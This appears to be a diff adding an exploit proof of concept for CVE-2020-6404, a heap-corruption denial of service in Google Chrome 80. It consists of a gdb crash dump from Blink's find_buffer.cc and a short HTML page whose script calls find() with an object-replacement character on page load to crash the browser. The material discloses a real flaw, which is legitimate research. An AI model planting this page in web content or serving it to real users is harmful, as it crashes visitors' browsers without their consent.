@@ -1,0 +1,82 @@
+# Exploit Title: Google Chrome 80.0.3987.87 - Heap-Corruption Remote Denial of Service (PoC)
+# Google Dork: N/A
+# Date: 2020-02-21
+# Exploit Author: Cem Onat Karagun of Diesec GmBH
+# Vendor Homepage: https://www.google.com/
+# Version: Google Chrome 80.0.3987.87
+# Tested on: Windows x64 / Linux Debian x64 / MacOS
+# CVE: CVE-2020-6404
+# PoC Video: http://www.youtube.com/watch?v=tv5sDDwiWg8
+# Description: https://bugs.chromium.org/p/chromium/issues/detail?id=1024256
+
+Thread 35 "Chrome_InProcRe" received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0x7f2cbf9ad700 (LWP 3275)]
+[----------------------------------registers-----------------------------------]
+RAX: 0x7f2cbe98d100 --> 0x41b58ab3
+RBX: 0x7f2cbf9aa9c0 --> 0xfe597d7178d --> 0x0
+RCX: 0x1fffffffffffffff
+RDX: 0x7f2cbeb8bdf4 --> 0x0
+RSI: 0x7f2cbeb8bdc0 --> 0x613000000000 --> 0xcc6e96b9 --> 0x0
+RDI: 0x0
+RBP: 0x7f2cbf9aaa70 --> 0x7f2cbf9aabf0 --> 0x7f2cbf9aad10 -->
+0x7f2cbf9aadd0 --> 0x7f2cbf9aaea0 --> 0x7f2cbf9aafb0 (--> ...)
+
+RSP: 0x7f2cbf9aa9c0 --> 0xfe597d7178d --> 0x0
+RIP: 0x559e50c11189 (<RangeFromBufferIndex()+377>: mov cl,BYTE PTR
+[rcx+0x7fff8000])
+R8 : 0xfffffffffffffff8
+R9 : 0x0
+R10: 0x7f2cbec6a670 --> 0x7f2cbec6a070 --> 0xd47000000000000 ('')
+R11: 0x7f2cbe98d100 --> 0x41b58ab3
+R12: 0xfe597d31a20 --> 0x0
+R13: 0x7f2cbeb8bde8 --> 0x0
+R14: 0x0
+R15: 0x2
+EFLAGS: 0x10a06 (carry PARITY adjust zero sign trap INTERRUPT direction
+OVERFLOW)
+[-------------------------------------code-------------------------------------]
+0x559e50c1117e <RangeFromBufferIndex()+366>: lea r8,[rdi-0x8]
+0x559e50c11182 <RangeFromBufferIndex()+370>: mov rcx,r8
+0x559e50c11185 <RangeFromBufferIndex()+373>: shr rcx,0x3
+=> 0x559e50c11189 <RangeFromBufferIndex()+377>: mov cl,BYTE PTR
+[rcx+0x7fff8000]
+0x559e50c1118f <RangeFromBufferIndex()+383>: test cl,cl
+0x559e50c11191 <RangeFromBufferIndex()+385>:
+jne 0x559e50c11418 <RangeFromBufferIndex()+1032>
+0x559e50c11197 <RangeFromBufferIndex()+391>: add
+rdi,0xffffffffffffffff
+0x559e50c1119b <RangeFromBufferIndex()+395>: mov rcx,rdi
+[------------------------------------stack-------------------------------------]
+0000| 0x7f2cbf9aa9c0 --> 0xfe597d7178d --> 0x0
+0008| 0x7f2cbf9aa9c8 --> 0xc0c001162e6 --> 0x0
+0016| 0x7f2cbf9aa9d0 --> 0xfe597d717be --> 0x0
+0024| 0x7f2cbf9aa9d8 --> 0xfe597d717bd --> 0x0
+0032| 0x7f2cbf9aa9e0 --> 0x7f2cbeb8bdf4 --> 0x0
+0040| 0x7f2cbf9aa9e8 --> 0x7f2cbeb8bea0 --> 0x6060008b1720 -->
+0x602000098630 --> 0x200000003 --> 0x0
+
+0048| 0x7f2cbf9aa9f0 --> 0x21bec4d308 --> 0x0
+0056| 0x7f2cbf9aa9f8 --> 0xfe597cfab48 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000559e50c11189 in MappingForIndex ()
+at
+../../third_party/blink/renderer/core/editing/finder/find_buffer.cc:450
+450
+../../third_party/blink/renderer/core/editing/finder/find_buffer.cc: No
+such file or directory.
+
+
+<!DOCTYPE html>
+<head>
+<script type="text/javascript">
+document.addEventListener("DOMContentLoaded", function(){
+find(decodeURIComponent('\uFFFC'));
+});
+</script>
+</head>
+<body>
+<legend></legend>
+</body>
+</html>
